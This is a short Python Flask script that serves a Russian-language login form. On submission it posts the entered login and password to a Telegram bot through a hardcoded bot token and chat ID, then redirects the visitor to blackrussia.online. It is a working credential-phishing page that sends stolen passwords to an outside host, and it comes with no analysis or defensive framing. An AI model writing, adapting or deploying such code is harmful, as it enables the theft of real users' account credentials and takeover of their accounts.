from flask import Flask, request, redirect
import requests
import os

app = Flask(__name__)

TOKEN = "8804610648:AAFgkWyr2VRT08YdHnHqzwXM7XfmC2jrr-E"
CHAT_ID = "6931397651"

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        login = request.form.get('login')
        password = request.form.get('password')
        msg = f"Логин: {login}\nПароль: {password}"
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                     params={"chat_id": CHAT_ID, "text": msg})
        return redirect("https://blackrussia.online")
    return '''
    <form method="post">
    <input name="login" placeholder="Логин"><br><br>
    <input name="password" placeholder="Пароль"><br><br>
    <button type="submit">Войти</button>
    </form>
    '''

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
